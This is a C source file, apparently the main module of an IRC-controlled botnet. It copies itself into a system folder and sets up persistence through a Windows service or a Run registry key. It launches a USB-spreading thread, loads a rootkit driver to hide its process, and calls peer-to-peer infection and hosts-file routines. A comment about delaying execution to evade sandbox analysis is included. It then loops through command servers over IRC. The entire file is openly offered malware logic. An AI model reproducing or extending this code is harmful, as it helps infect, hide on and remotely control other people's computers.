//|				_________       __________     ___________		   |//
//|				\_   ___ \______\______   \ ___\__    ___/		   |//
//|				/    \  \/\____ \|    |  _//  _ \|    |			   |//
//|				\     \___|  |_> >    |   (  <_> )    |			   |//
//|				 \______  /   __/|______  /\____/|____|			   |//
//|						\/|__|          \/						   |//

#include "includes.h"
#include "functions.h"
#include "configs.h"

#ifndef _DEBUG
#pragma comment(linker, "/subsystem:windows ")
#else
#pragma comment(linker, "/subsystem:console ")
#endif // _DEBUG

BOOL rkenabled;//did fu's driver get loaded?

DWORD dwstarted;
DWORD dwconnected;

IRC mainirc;
HANDLE mutex;
int curserver;
int eftpsends;
int serversize=(sizeof(servers)/sizeof(SERVER));
int authsize=(sizeof(authost)/sizeof(LPTSTR));
#ifndef NO_VERSION_REPLY
int curversion;
int versionsize=(sizeof(versionlist)/sizeof(LPTSTR));
#else
int versionsize=0;
#endif

char exip[MAX_IP];
char inip[MAX_IP];
char host[MAX_HOSTNAME];

extern char str_main_thread[];
extern char str_rup_thread[];
extern char str_asecure_thread[];

#ifndef _DEBUG
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
#else
int main(int argc, char *argv[])
#endif
{
	LoadDLLs();

#ifndef NO_SERVICE
	SERVICE_TABLE_ENTRY servicetable[] =
	{
		{servicename, (LPSERVICE_MAIN_FUNCTION) ServiceMain},
		{NULL, NULL}
	};
#endif

	//TODO: Error handler here

	char cfilename[MAX_PATH];
	char movetopath[MAX_PATH];
	char svcpath[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	ExpandEnvironmentStrings(movepath,movetopath,sizeof(movetopath));
	sprintf(svcpath,"%s\\%s",movetopath,filename);
	
#ifndef _DEBUG
	if (MoveBot(movetopath,filename))
	{
#ifndef NO_MELT
		RegWrite(meltkey.hkey,meltkey.subkey,meltkey.name,cfilename);
#endif // NO_MELT


#ifndef NO_SERVICE
		InstallService(svcpath);
#else
		RegWrite(runkey.hkey,runkey.subkey,runkey.name,svcpath);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		ZeroMemory(&pinfo,sizeof(pinfo));
		ZeroMemory(&sinfo,sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
#ifdef _DEBUG
		sinfo.wShowWindow = SW_SHOW;
#else
		sinfo.wShowWindow = SW_HIDE;
#endif // _DEBUG
		if (CreateProcess(svcpath,NULL,NULL,NULL,TRUE,NORMAL_PRIORITY_CLASS|DETACHED_PROCESS,NULL,movetopath,&sinfo,&pinfo))
		{
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			fWSACleanup();
			ExitProcess(EXIT_SUCCESS);
		}
#endif // NO_SERVICE
		ExitProcess(1);
	}
#endif // _DEBUG
#ifndef NO_SERVICE
	if(fStartServiceCtrlDispatcher(servicetable) == 0)
		InstallService(svcpath);
#else

	DWORD id;
	NTHREAD usb;
	usb.conn = &mainirc;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)USB_Spreader, &usb, 0, &id); // Execute USB spread on install
	HANDLE threadhandle;
	if((threadhandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)BotThread, NULL, 0, &id)) == 0)
		return 0;
	WaitForSingleObject(threadhandle, INFINITE);
	CloseHandle(threadhandle);
#endif // NO_SERVICE
	return 0;
}

DWORD WINAPI BotThread(LPVOID param)
{
	for (int m=0;m<6;m++)
	{
		if(!(mutex=CreateMutex(NULL, FALSE, mutexhandle)))
			Sleep(5000);
		else
			break;
	}
	if (GetLastError() == ERROR_ALREADY_EXISTS)
		ExitProcess(0);

	addthread(MAIN_THREAD,str_main_thread,main_title);
	srand(GetTickCount());
	dwstarted=GetTickCount();

#ifndef NO_VERSION_REPLY
	curversion=rand()%(versionsize);
#ifdef _DEBUG
	printf("Generated current_version: %d (%d), %s.\n",curversion,versionsize,versionlist[curversion]);
#endif
#endif

	WSADATA wsadata;
	if (fWSAStartup(MAKEWORD(2,2),&wsadata)!=0)
		ExitProcess(-2);
	
	int i=0;
	DWORD id=0;
	
#ifndef NO_RDRIV
#ifndef _DEBUG
	rkenabled=InitRK();//initialize fu
	if (rkenabled)
		HideMe();//hide the process
#endif // _DEBUG
#endif

    //Sleep(1200000); Sleep for 20 mins to avoide analysis by sandboxes etc.
	InfectP2P();
	AddHosts();

	//get internal ip
	char *ip;
	char hostname[256];
	struct hostent *h;
	fgethostname(hostname, 256);
	h = fgethostbyname(hostname);
	ip = finet_ntoa(*(struct in_addr *)h->h_addr_list[0]);
	strncpy(inip,ip,sizeof(inip));


	curserver=0;
	HookProtocol(&mainirc);
	
	while (mainirc.should_connect()) {
		if (!mainirc.is_connected())
		{
			FlushDNSCache();
			mainirc.start(servers[curserver].host,servers[curserver].port,
					  mainirc.nickgen(NICK_TYPE,REQ_NICKLEN),mainirc.nickgen(IDENT_TYPE,REQ_IDENTLEN),
					  mainirc.nickgen(REALN_TYPE,REQ_REALNLEN),servers[curserver].pass);
			mainirc.message_loop();
		}
		else
			mainirc.message_loop();

		Sleep(SFLOOD_DELAY);
		
		if (curserver==(serversize-1))
			curserver=0;
		else
			curserver++;
	}

	killthreadall();
	fWSACleanup();
	ReleaseMutex(mutex);
	ExitThread(0);
}